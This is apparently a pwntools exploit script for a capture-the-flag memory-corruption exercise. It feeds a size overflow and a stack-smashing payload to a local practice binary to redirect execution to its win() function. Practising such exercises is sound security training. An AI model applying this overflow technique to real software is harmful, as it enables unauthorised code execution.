from pwn import * 

context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64 
context.terminal = ['tmux', 'splitw', '-v']

proc = process(["/challenge/babymem_level5.0"])
proc.recvuntil(b'Number of payload records to send: ')

proc.sendline(b'65536')

proc.recvuntil(b'Size of each payload record: ')
proc.sendline(b'65536')

proc.recv()
payload = b'A' * 55 + p8(0x00) + p64(0x00007ffce8e36b80) + p64(0x0000000000000000) + p64(0x00007ffce8e35b00) + p64(0x00007ffce8e36b80) + p64(0x0000000000401656)
proc.sendline(payload)

proc.interactive()

# return address of the win() function => 0000000000401656
